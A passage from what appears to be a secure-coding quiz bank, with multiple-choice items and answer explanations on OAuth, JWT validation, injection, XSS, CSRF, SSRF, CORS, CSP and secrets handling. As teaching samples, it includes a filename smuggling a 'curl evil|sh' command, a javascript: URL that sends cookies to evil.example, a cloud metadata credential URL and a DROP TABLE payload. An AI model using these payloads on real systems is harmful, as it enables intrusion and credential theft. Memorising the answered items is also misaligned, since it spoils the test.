A stolen authorization code being redeemed by an attacker
Replay of a valid access token at a different API
explanation: The client sends a hash of a random code_verifier with the authorization request and the verifier itself when redeeming the code. An attacker who intercepts the code (for example via a malicious app registered for the same redirect scheme) cannot produce the verifier. PKCE does nothing about tokens already issued; it is now recommended for all clients, including confidential ones.

title: Token for one API accepted by another
question: Your identity provider issues JWT access tokens for several APIs. A token issued for the low-privilege Reports API is accepted by the Payments API. Which validation is the Payments API missing?
options: The expiry (exp) claim check
The not-before (nbf) claim check
The audience (aud) claim check
The JWT ID (jti) uniqueness check
explanation: Both APIs trust the same issuer and signing key, so the signature is valid; only the aud claim says which recipient the token is meant for. Each API must reject tokens whose audience is not itself. exp and nbf validate time windows and jti helps detect replay, none of which distinguish APIs.

title: Forging an RS256 token with the public key
question: An API expects RS256 tokens and calls `verify(token, publicKeyPem)` from a library that picks the algorithm from the token header. An attacker forges an admin token using only the published public key. What did they most likely do?
options: Set alg to HS256 and signed with the public key bytes as the HMAC secret
Factored the RSA modulus from the public key to recover the private key
Re-signed the token with RS512 using the public key as the signing key
Removed the signature segment and kept alg set to RS256
explanation: In algorithm confusion, the verifier treats the public key, which is known to everyone, as an HMAC secret because the header says HS256, so the attacker's HMAC validates. The fix is to pin the accepted algorithm and key type on the server rather than trusting the header. RSA keys of normal size cannot be factored, and a missing signature fails RS256 verification.

title: Detecting a stolen refresh token
question: An authorization server rotates refresh tokens on every use. It receives a refresh token that was already exchanged earlier. What should it do?
options: Issue new tokens, because the token is still within its validity period
Treat it as likely theft and revoke the whole family of tokens from that grant
Reject only this request and leave the most recently issued token valid
Ask the client to re-authenticate the user with PKCE before issuing tokens
explanation: With rotation, each refresh token is single-use. Seeing a used one again means two parties hold it (the legitimate client and an attacker), and the server cannot tell which is which, so the OAuth security BCP recommends invalidating the active refresh token for that grant. Rejecting only this request leaves the attacker's token working if they refreshed first.

title: Primary defence against SQL injection
question: What is the primary defence against SQL injection when user input is used in a query's WHERE clause?
options: Escaping single quotes in the input with a regular expression
Hiding database error messages from end users
Placing a web application firewall in front of the application
Parameterized queries that bind the input as data
explanation: Parameterized queries send the SQL structure and the values separately, so input can never change the query's meaning. Hand-rolled escaping misses edge cases (encodings, numeric contexts), hiding errors only makes exploitation blind rather than impossible, and a WAF is a bypassable extra layer, not the fix.

title: Shelling out with a user filename
question: A Python service runs `subprocess.run(f"convert {filename} out.png", shell=True)` with a user-supplied filename. What is the best fix?
options: Pass an argument list with shell=False and validate the filename
Wrap filename in double quotes inside the f-string before running it
Strip semicolons and ampersands from filename before running it
Run the command inside a container so the shell cannot reach the host
explanation: With shell=True the string is parsed by /bin/sh, so input like 'a.jpg; curl evil|sh' runs extra commands. An argument list bypasses the shell entirely; you should still validate input and use '--' so a name like '-delete' is not treated as an option. Quoting and blocklists are easily bypassed with $(), backticks or newlines, and containers only reduce impact.

title: Path traversal through os.path.join
question: A download endpoint does `open(os.path.join(BASE_DIR, user_path))`, and you already reject any user_path containing '..'. An attacker requests user_path=/etc/passwd. What happens?
options: os.path.join prepends BASE_DIR, producing BASE_DIR/etc/passwd, which is safe
Python raises ValueError because an absolute path cannot be joined
os.path.join discards BASE_DIR for an absolute path, so /etc/passwd is opened
open() refuses absolute paths unless the file is opened in binary mode
explanation: When a later component of os.path.join is absolute, all previous components are thrown away. Blocking '..' is therefore not enough. The robust defence is to avoid user-controlled paths (use IDs), or resolve the canonical path and verify it is still inside the base directory.

title: Core fix for stored XSS
question: Users can post comments that are shown to other users, and an attacker stored `<script>` in one. What is the core fix?
options: Removing the string <script> from comments before saving them
Serving the site over HTTPS with HSTS enabled
Storing comments base64-encoded in the database
Context-aware output encoding, such as template auto-escaping
explanation: XSS happens when data is interpreted as markup or code by the browser. Encoding at output for the specific context (HTML body, attribute, JavaScript, URL) turns it back into text. Blocklist filtering is bypassed with event handlers such as onerror, HTTPS does not affect content, and base64 storage changes nothing once the value is decoded and rendered.

title: XSS despite HTML auto-escaping
question: A template engine HTML-escapes every variable. A profile page renders `My site`. Which website value still leads to script execution?
options: <script>alert(document.cookie)</script>
javascript:fetch('//evil.example?c='+document.cookie)
">
'; DROP TABLE users; --
explanation: HTML escaping neutralises angle brackets and quotes, so the tag and attribute-breakout payloads are rendered harmlessly, but a javascript: URL contains nothing to escape and runs when clicked. URLs in href or src need scheme validation against an allow-list such as http and https. The last value is a SQL payload irrelevant to HTML rendering.

title: When SameSite=Lax cookies are still sent
question: Your session cookie has SameSite=Lax. A page on evil.example triggers each of the following requests to your site. Which one still includes the session cookie?
options: A POST form auto-submitted from a hidden iframe
A top-level GET navigation when the user clicks a link
A fetch() call made with credentials: 'include'
An tag whose src points at your site
explanation: Lax cookies are withheld on cross-site subrequests (images, iframes, fetch) and on cross-site POSTs, but are sent on top-level navigations using safe methods like GET. That is why state-changing actions must never be reachable via GET, and why SameSite complements rather than replaces CSRF tokens.

title: XSS the WAF never sees
question: A page runs `document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1))`. Attacks succeed, yet neither the WAF nor server logs show any payload. Why, and what is the fix?
options: The WAF decodes URL encoding only once; enable recursive decoding in its rules
The server strips the payload before logging it; log raw request bodies instead
Browsers send fragments only over HTTP/2; force HTTP/1.1 so the WAF inspects them
Fragments never reach the server; use textContent instead of innerHTML
explanation: Everything after # stays in the browser, so this DOM-based XSS bypasses any server-side inspection. The sink is innerHTML; writing with textContent treats the value as text, and Trusted Types can enforce that dangerous sinks only receive sanitised values. No HTTP version sends fragments.

title: Weakness of naive double-submit cookies
question: An app defends CSRF by checking that a header value equals a random csrf cookie value (naive double submit). The attacker controls a sibling subdomain. How can they bypass it?
options: Set their own csrf cookie for the parent domain and send the matching value in the request
Read the victim's csrf cookie from the sibling subdomain through the CORS preflight
Replay the header captured from an earlier request, since the value never expires
Remove the Origin header so the server skips the comparison entirely
explanation: The server only checks that the two values match, not that it issued them. A sibling subdomain (or a network attacker on plain HTTP) can plant a cookie for the shared parent domain, then make both sides match. OWASP recommends the signed double-submit variant, where the token is an HMAC bound to the user's session.

title: Image fetcher hits the metadata endpoint
question: A feature on an EC2 instance downloads an image from any user-supplied URL. An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. What is the risk?
options: Reflected XSS when the image preview renders the metadata response
DNS rebinding of the application's own hostname to the attacker
SSRF that exposes the instance role's temporary cloud credentials
Denial of service, because link-local addresses cannot be routed
explanation: The server makes the request from inside the cloud network, where the link-local metadata service hands out IAM role credentials. Returning or leaking that response gives the attacker those privileges. Defences include allow-listing destinations, blocking internal and link-local ranges, and enforcing IMDSv2.

title: SSRF validation bypass
question: To prevent SSRF, your code resolves the URL's hostname, rejects private and link-local IPs, then calls an HTTP client with the original URL. Attackers still reach 169.254.169.254. Which bypass explains this?
options: The name resolves to a public IP during validation and to the internal IP at fetch time
The HTTP client ignores the hostname and always connects to the metadata address
Link-local addresses are excluded from private-range checks by the IP specification
IMDSv2 tokens let any request reach the metadata endpoint once one is issued
explanation: Checking and connecting resolve DNS separately, so an attacker-controlled name with a tiny TTL can answer differently each time (DNS rebinding); following redirects to internal addresses has the same effect. Fix it by connecting to the exact validated IP, re-validating every redirect, and enforcing IMDSv2, whose PUT-obtained token blocks most simple SSRF.

title: Reflecting Origin with credentials
question: To fix a CORS error, a developer makes the API echo the request's Origin header into Access-Control-Allow-Origin and also sends `Access-Control-Allow-Credentials: true`. What is the consequence?
options: Browsers block the response because a reflected origin is treated as a wildcard
Only same-site subdomains can read responses, because cookies are domain-scoped
Any site can send credentialed requests and read the victim's responses
Preflight requests fail, so only simple GET requests continue to work
explanation: Browsers forbid '*' together with credentials, but an echoed concrete origin is accepted, so evil.example can read the victim's data using their cookies. The correct approach is an explicit allow-list of trusted origins. Browsers cannot tell a reflected value from a configured one, and preflights succeed with the echoed origin.

title: Nonce-based CSP versus host allow-lists
question: Why does OWASP favour a strict CSP such as `script-src 'nonce-{random}' 'strict-dynamic'` over a list of allowed script hosts like cdn.example.com?
options: Host allow-lists are not supported by current browsers and are ignored
Allowed hosts often serve JSONP or old libraries that can be abused to run attacker-chosen code
Nonces remove the need for output encoding, so XSS cannot occur at all
strict-dynamic blocks every inline script, including those with a valid nonce
explanation: Large CDNs and API hosts frequently expose endpoints or library versions that an attacker can use as script gadgets, making allow-lists bypassable. A per-response unguessable nonce lets only scripts the server intended run, and strict-dynamic extends trust to scripts they load. CSP is defence in depth, not a replacement for encoding, and nonced inline scripts do run.

title: Where a production DB password should live
question: Where should the production database password for a containerised service be kept?
options: In the Dockerfile as an ENV instruction so it ships with the image
In a .env file committed to a private repository
Hardcoded in the source code but obfuscated with base64
In a secrets manager, injected at runtime for that service only
explanation: A secrets manager provides access control, audit logging and rotation, and runtime injection keeps the secret out of images and source. ENV values are baked into image layers anyone with the image can read, private repositories are still widely cloned, and base64 is encoding, not protection.

title: Removing long-lived cloud keys from CI
question: A CI pipeline deploys to the cloud using a long-lived access key stored as a CI secret with broad permissions. What is the better design?
options: Rotate the long-lived key monthly and keep it stored as a masked CI secret
Encrypt the key with a passphrase that is stored in a second CI secret
OIDC federation exchanging a job token for short-lived credentials
Move the key into the repository's encrypted config file used at deploy time
explanation: With OIDC, the CI provider issues a token describing the repository, branch and environment, and the cloud trust policy grants a role only to matching claims for a short time. No static secret exists to leak, and permissions can be scoped per job. Rotation shortens exposure but keeps a standing key, and encrypting the key just moves the secret.

title: Classifying a threat with STRIDE
question: During threat modelling you note that an attacker on the internal network could modify order totals in transit between two services. Which STRIDE category is this?
options: Spoofing
Tampering
Repudiation
Information disclosure
explanation: Tampering is unauthorised modification of data, at rest or in transit; mutual TLS or message signing mitigates it. Spoofing is pretending to be someone else, repudiation is denying an action without proof, and information disclosure is reading data you should not see.

title: Where to focus in a data flow diagram
question: Your team has drawn a data flow diagram of a new payments feature. Where should threat analysis focus first?
options: Data flows that cross trust boundaries, such as internet to API or API to third party
Internal function calls within a single service, where most bugs are found
Components that have had the most code changes in the last sprint
Database tables that store the largest volume of rows
explanation: Trust boundaries mark where data moves between areas with different privileges or owners, which is where authentication, authorisation, validation and encryption decisions matter and where attackers enter. Calls inside one trust zone, code churn and table size are weaker signals of attack surface.

title: Deserializing untrusted data
question: A Java service accepts a base64 blob from clients and restores it with ObjectInputStream.readObject(). What is the main risk and remedy?
options: The blob may be too large; cap the input size and readObject() becomes safe
Base64 can be tampered with; switch to hex encoding before deserializing
Deserialized objects may be stale; add a version field and reject old ones
Gadget chains can lead to RCE; accept a data-only format such as JSON
explanation: Native deserialization instantiates arbitrary classes on the classpath and runs their callbacks, so crafted object graphs can chain library code into command execution before your code ever inspects the result. Size limits and encodings do not change that; avoid native serialization for untrusted input, or at least use strict class allow-listing filters.

title: Comparing webhook signatures
question: A webhook handler computes an HMAC and checks it with `if computed == request_signature:`. What is wrong and how is it fixed in Python?
options: == compares object identity for strings; use computed.equals(request_signature)
HMACs must be decrypted before comparing; use hmac.decrypt first
Early-exit comparison leaks timing information; use hmac.compare_digest
The comparison is case-sensitive; lowercase both values before checking
explanation: A normal comparison returns as soon as a byte differs, so response timing can reveal how many leading bytes are correct and allow a signature to be guessed incrementally. hmac.compare_digest takes time independent of where the difference is. In Python == compares values, and HMACs are not encrypted.
